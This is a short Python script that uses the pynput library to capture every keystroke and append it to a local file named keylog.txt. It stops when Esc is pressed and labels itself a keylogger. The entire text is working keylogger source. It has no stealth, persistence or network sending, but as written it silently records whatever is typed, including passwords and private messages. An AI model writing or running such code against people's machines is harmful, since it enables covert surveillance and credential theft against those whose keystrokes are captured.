from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        # Writing the pressed key to the log file
        with open(log_file, 'a') as f:
            f.write(f"{key} pressed\n")
    except Exception as e:
        print(f"Error writing to file: {str(e)}")

def on_release(key):
    if key == Key.esc:  # Stop listener on pressing Esc key
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()  # Start the listener to monitor keystrokes
    except KeyboardInterrupt:
        print("Keylogger stopped.")

